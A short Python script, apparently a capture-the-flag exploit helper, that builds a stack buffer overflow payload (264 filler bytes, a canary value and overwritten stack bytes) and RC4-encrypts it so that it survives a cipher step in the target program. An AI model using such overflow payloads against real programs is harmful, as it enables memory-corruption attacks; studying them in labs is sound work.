from Crypto.Cipher import ARC4


key = b"AAABC"
l = 256 + 8
stack = b'\xecY\xba\xde9\xf6((\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\t\xc7d\x9d\xcb\xf6I\x8c'
# canary = bytes.fromhex("e4f965a446de6600")[::-1]
payload = b"A" * l + stack

rc4 = ARC4.new(key)

c = rc4.encrypt(payload)
print(c[256+8:])
